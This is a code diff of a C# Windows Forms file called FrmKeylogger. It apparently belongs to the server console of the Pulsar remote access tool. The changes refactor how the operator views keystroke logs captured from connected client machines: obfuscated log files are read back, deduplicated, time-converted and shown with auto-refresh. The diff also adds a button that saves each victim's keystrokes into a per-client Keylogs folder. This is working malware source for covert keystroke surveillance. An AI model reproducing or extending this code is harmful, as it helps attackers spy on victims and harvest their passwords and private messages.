@@ -21,14 +21,13 @@ namespace Pulsar.Server.Forms
     {
         private readonly Client _connectClient;
         private readonly KeyloggerHandler _keyloggerHandler;
-        private static readonly Dictionary<Client, FrmKeylogger> OpenedForms = new();
+        private static readonly Dictionary<Client, FrmKeylogger> OpenedForms = new Dictionary<Client, FrmKeylogger>();
 
-        private readonly Timer autoRefreshTimer = new();
-        private StringBuilder currentLogCache = new();
-        private string _previousContent = string.Empty;
+        private readonly Timer autoRefreshTimer = new Timer();
+        private StringBuilder currentLogCache = new StringBuilder();
         private readonly object _contentLock = new object();
         private DateTime _lastRefreshTime = DateTime.MinValue;
-        private readonly TimeSpan _minimumRefreshInterval = TimeSpan.FromMilliseconds(500);
+        private readonly TimeSpan _minimumRefreshInterval = TimeSpan.FromMilliseconds(1000);
         private FileSystemWatcher _fileWatcher;
         private string _currentWatchedFile;
 
@@ -54,7 +53,7 @@ namespace Pulsar.Server.Forms
 
             RegisterMessageHandler();
 
-            // SYNC WITH CLIENT: 2-second refresh to match keylogger flush interval
+            // Refresh interval synchronized with keylogger flush (2s)
             autoRefreshTimer.Interval = 2000;
             autoRefreshTimer.Tick += AutoRefreshTimer_Tick;
 
@@ -70,23 +69,26 @@ namespace Pulsar.Server.Forms
                 NotifyFilter = NotifyFilters.LastWrite | NotifyFilters.Size,
                 EnableRaisingEvents = false
             };
-
             _fileWatcher.Changed += FileWatcher_Changed;
         }
 
         private void FileWatcher_Changed(object sender, FileSystemEventArgs e)
         {
             if (e.ChangeType == WatcherChangeTypes.Changed &&
-                e.FullPath == _currentWatchedFile &&
-                lstLogs.SelectedItems.Count > 0)
+                e.FullPath == _currentWatchedFile)
             {
-                System.Threading.Thread.Sleep(100); // small delay to ensure file is not locked
-                SafeInvoke(RefreshSelectedLog);
+                System.Threading.Thread.Sleep(50); // wait for write completion
+                SafeInvoke(() => RefreshSelectedLog());
             }
         }
 
         private void AutoRefreshTimer_Tick(object sender, EventArgs e)
         {
+            if ((DateTime.UtcNow - _lastRefreshTime) < _minimumRefreshInterval)
+                return;
+
+            _lastRefreshTime = DateTime.UtcNow;
+
             if (checkBox1.Checked && lstLogs.SelectedItems.Count > 0)
                 RefreshSelectedLog();
         }
@@ -111,25 +113,11 @@ namespace Pulsar.Server.Forms
                 SafeInvoke(Close);
         }
 
-        private void LogsChanged(object? sender, string message)
+        private void LogsChanged(object sender, string message)
         {
             SafeInvoke(RefreshLogsDirectory);
         }
-        private void ApplyGreenToHeaders()
-        {
-            // Regex to match lines starting with [HH:MM:SS]
-            var regex = new System.Text.RegularExpressions.Regex(@"^\[\d{2}:\d{2}:\d{2}\].*$",
-                System.Text.RegularExpressions.RegexOptions.Multiline);
 
-            foreach (System.Text.RegularExpressions.Match match in regex.Matches(rtbLogViewer.Text))
-            {
-                rtbLogViewer.Select(match.Index, match.Length);
-                rtbLogViewer.SelectionColor = Color.LimeGreen; // make the whole line green
-            }
-
-            rtbLogViewer.SelectionStart = rtbLogViewer.Text.Length;
-            rtbLogViewer.SelectionColor = rtbLogViewer.ForeColor; // reset default color for normal text
-        }
         private void FrmKeylogger_Load(object sender, EventArgs e)
         {
             Text = WindowHelper.GetWindowTitle("Keylogger", _connectClient);
@@ -180,30 +168,27 @@ namespace Pulsar.Server.Forms
 
         private void RefreshLogsDirectory()
         {
-            string previouslySelected = lstLogs.SelectedItems.Count > 0 ? lstLogs.SelectedItems[0].Text : null;
-
             SafeInvoke(() =>
             {
+                string previous = lstLogs.SelectedItems.Count > 0 ? lstLogs.SelectedItems[0].Text : null;
                 lstLogs.Items.Clear();
+
                 try
                 {
-                    // Regex: 2025-11-10.txt or 2025-11-10_01.txt
                     var validPattern = new System.Text.RegularExpressions.Regex(@"^\d{4}-\d{2}-\d{2}(?:_\d{2})?\.txt$");
-
                     var files = new DirectoryInfo(Path.GetTempPath())
                         .GetFiles("*.txt")
-                        .Where(f => validPattern.IsMatch(f.Name)) // ✅ filter only valid log filenames
+                        .Where(f => validPattern.IsMatch(f.Name))
                         .OrderByDescending(f => f.LastWriteTime)
                         .ToList();
 
-                    foreach (var file in files)
-                        lstLogs.Items.Add(new ListViewItem(file.Name));
+                    foreach (var f in files)
+                        lstLogs.Items.Add(new ListViewItem(f.Name));
 
-                    // Restore previous selection if it still exists
-                    if (!string.IsNullOrEmpty(previouslySelected))
+                    // restore previous selection
+                    if (!string.IsNullOrEmpty(previous))
                     {
-                        var item = lstLogs.Items.Cast<ListViewItem>()
-                            .FirstOrDefault(i => i.Text == previouslySelected);
+                        var item = lstLogs.Items.Cast<ListViewItem>().FirstOrDefault(i => i.Text == previous);
                         if (item != null)
                         {
                             item.Selected = true;
@@ -224,6 +209,9 @@ namespace Pulsar.Server.Forms
                 }
             });
         }
+        [System.Runtime.InteropServices.DllImport("user32.dll")]
+        private static extern IntPtr SendMessage(IntPtr hWnd, int msg, IntPtr wParam, IntPtr lParam);
+        private const int WM_SETREDRAW = 0x0B;
 
         private void RefreshSelectedLog()
         {
@@ -244,35 +232,31 @@ namespace Pulsar.Server.Forms
                     string logContent = ReadFileWithRetry(logFilePath);
                     if (logContent == null) return;
 
-                    // Remove spam & duplicates, then merge broken lines
-                    string filteredContent = FilterAndDeduplicateLog(logContent);
-                    filteredContent = MergeBrokenLines(filteredContent);
+                    // Deduplicate & merge broken lines
+                    string filtered = FilterAndDeduplicateLog(logContent);
+                    filtered = MergeBrokenLines(filtered);
 
                     lock (_contentLock)
                     {
-                        if (filteredContent != currentLogCache.ToString())
+                        if (filtered != currentLogCache.ToString())
                         {
                             currentLogCache.Clear();
-                            currentLogCache.Append(filteredContent);
+                            currentLogCache.Append(filtered);
 
                             SafeInvoke(() =>
                             {
                                 rtbLogViewer.Clear();
                                 rtbLogViewer.Text = currentLogCache.ToString();
-
-                                // Color any line starting with [HH:MM:SS] green
                                 ApplyGreenToHeaders();
-
                                 rtbLogViewer.SelectionStart = rtbLogViewer.Text.Length;
                                 rtbLogViewer.ScrollToCaret();
                             });
-
                         }
                     }
                 }
                 catch (Exception ex)
                 {
-                    SafeInvoke(() => rtbLogViewer.Text = $"Error loading log file: {ex.Message}");
+                    SafeInvoke(() => rtbLogViewer.Text = $"Error loading log: {ex.Message}");
                 }
             });
         }
@@ -281,14 +265,8 @@ namespace Pulsar.Server.Forms
         {
             for (int i = 0; i < maxRetries; i++)
             {
-                try
-                {
-                    return FileHelper.ReadObfuscatedLogFile(filePath);
-                }
-                catch (IOException) when (i < maxRetries - 1)
-                {
-                    System.Threading.Thread.Sleep(50);
-                }
+                try { return FileHelper.ReadObfuscatedLogFile(filePath); }
+                catch (IOException) when (i < maxRetries - 1) { System.Threading.Thread.Sleep(50); }
             }
             return null;
         }
@@ -303,18 +281,14 @@ namespace Pulsar.Server.Forms
 
             foreach (var line in lines)
             {
-                var trimmed = line.Trim();
+                string trimmed = line.Trim();
+                if (string.IsNullOrEmpty(trimmed)) continue;
 
                 if (trimmed.StartsWith("Log created on") ||
                     trimmed.StartsWith("Session started at:") ||
-                    trimmed.StartsWith("========================================"))
-                    continue;
+                    trimmed.StartsWith("===")) continue;
 
-                if (!seen.Contains(trimmed))
-                {
-                    result.Add(trimmed);
-                    seen.Add(trimmed);
-                }
+                if (seen.Add(trimmed)) result.Add(trimmed);
             }
 
             return string.Join(Environment.NewLine, result);
@@ -334,9 +308,19 @@ namespace Pulsar.Server.Forms
                 var trimmed = line.Trim();
                 if (string.IsNullOrEmpty(trimmed)) continue;
 
-                // Header detection: [HH:MM:SS]
                 if (trimmed.StartsWith("[") && trimmed.Contains("]"))
                 {
+                    // Convert UTC to server local time
+                    string timePart = trimmed.Substring(1, Math.Min(8, trimmed.Length - 2)); // safely get HH:mm:ss
+                    if (DateTime.TryParseExact(timePart, "HH:mm:ss", null, System.Globalization.DateTimeStyles.AssumeUniversal, out DateTime utcTime))
+                    {
+                        var localTime = utcTime.ToLocalTime();
+                        if (trimmed.Length > 9)
+                            trimmed = $"[{localTime:hh:mm:ss tt}]" + trimmed.Substring(9);
+                        else
+                            trimmed = $"[{localTime:hh:mm:ss tt}]";
+                    }
+
                     if (currentHeader != null)
                     {
                         merged.AppendLine(currentHeader);
@@ -348,25 +332,7 @@ namespace Pulsar.Server.Forms
                 }
                 else
                 {
-                    // Append with a space only if last char is a letter/number and first char is NOT lowercase continuation
-                    if (textBuffer.Length > 0)
-                    {
-                        char lastChar = textBuffer[^1];
-                        char firstChar = trimmed[0];
-
-                        if (char.IsLetterOrDigit(lastChar) && char.IsLetterOrDigit(firstChar))
-                        {
-                            // Only remove space if it’s a lowercase continuation (like broken word)
-                            if (char.IsLower(lastChar) && char.IsLower(firstChar))
-                                ; // merge without space
-                            else
-                                textBuffer.Append(" "); // normal word separation
-                        }
-                        else
-                        {
-                            textBuffer.Append(" ");
-                        }
-                    }
+                    if (textBuffer.Length > 0) textBuffer.Append(" ");
                     textBuffer.Append(trimmed);
                 }
             }
@@ -374,39 +340,56 @@ namespace Pulsar.Server.Forms
             if (currentHeader != null)
             {
                 merged.AppendLine(currentHeader);
-                if (textBuffer.Length > 0)
-                    merged.AppendLine(textBuffer.ToString());
+                if (textBuffer.Length > 0) merged.AppendLine(textBuffer.ToString());
             }
 
             return merged.ToString();
         }
 
-        // Only remove spaces between letters, not between words or numbers
-        private string FixBrokenLetters(string text)
+        private void ApplyGreenToHeaders()
         {
-            return System.Text.RegularExpressions.Regex.Replace(
-                text, @"(?<=\w)\s(?=\w)", ""
-            );
+            // Match headers like [hh:mm:ss AM/PM] at the start of a line
+            var regex = new System.Text.RegularExpressions.Regex(@"^\[\d{2}:\d{2}:\d{2} [AP]M\].*$", System.Text.RegularExpressions.RegexOptions.Multiline);
+
+            foreach (System.Text.RegularExpressions.Match match in regex.Matches(rtbLogViewer.Text))
+            {
+                rtbLogViewer.Select(match.Index, match.Length);
+                rtbLogViewer.SelectionColor = Color.LimeGreen; // keep headers green
+            }
+
+            // Reset selection to end
+            rtbLogViewer.SelectionStart = rtbLogViewer.Text.Length;
+            rtbLogViewer.SelectionColor = rtbLogViewer.ForeColor;
         }
+
 
         private void SafeInvoke(Action action)
         {
-            if (InvokeRequired)
-                Invoke(action);
-            else
-                action();
+            if (InvokeRequired) Invoke(action);
+            else action();
         }
 
-        private async void button1_Click(object sender, EventArgs e)
+        private void button1_Click(object sender, EventArgs e)
         {
             _connectClient.Send(new GetKeyloggerLogsDirectory());
         }
-
 
         private void checkBox1_CheckedChanged_1(object sender, EventArgs e)
         {
             if (checkBox1.Checked)
             {
+                // Refresh log list
+                RefreshLogsDirectory();
+
+                // Select first log if any
+                if (lstLogs.Items.Count > 0)
+                {
+                    lstLogs.Items[0].Selected = true;
+                    lstLogs.Focus();
+                    UpdateFileWatcher();
+                    RefreshSelectedLog();
+                }
+
                 autoRefreshTimer.Start();
                 _fileWatcher.EnableRaisingEvents = true;
             }
@@ -416,5 +399,56 @@ namespace Pulsar.Server.Forms
                 _fileWatcher.EnableRaisingEvents = false;
             }
         }
+
+        private void btnGetLogs_Click(object sender, EventArgs e)
+        {
+            // Refresh log list
+            RefreshLogsDirectory();
+
+            // Select first log if any
+            if (lstLogs.Items.Count > 0)
+            {
+                lstLogs.Items[0].Selected = true;
+                lstLogs.Focus();
+                UpdateFileWatcher();
+                RefreshSelectedLog();
+            }
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                if (currentLogCache.Length == 0)
+                {
+                    MessageBox.Show("No log to save.", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                    return;
+                }
+
+                // Base folder same as FileManager download folder
+                string clientFolder = _connectClient.Value.DownloadDirectory;
+                if (string.IsNullOrWhiteSpace(clientFolder))
+                    clientFolder = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Clients", "UnknownClient");
+
+                // Create Keylogs subfolder
+                string keylogFolder = Path.Combine(clientFolder, "Keylogs");
+                if (!Directory.Exists(keylogFolder))
+                    Directory.CreateDirectory(keylogFolder);
+
+                // Save file with timestamp
+                string fileName = $"Keylog_{DateTime.Now:yyyy-MM-dd_HH-mm-ss}.txt";
+                string savePath = Path.Combine(keylogFolder, fileName);
+
+                File.WriteAllText(savePath, currentLogCache.ToString(), Encoding.UTF8);
+
+                MessageBox.Show($"Log saved to {savePath}", "Saved", MessageBoxButtons.OK, MessageBoxIcon.Information);
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show($"Failed to save log: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+        }
+
+
     }
 }
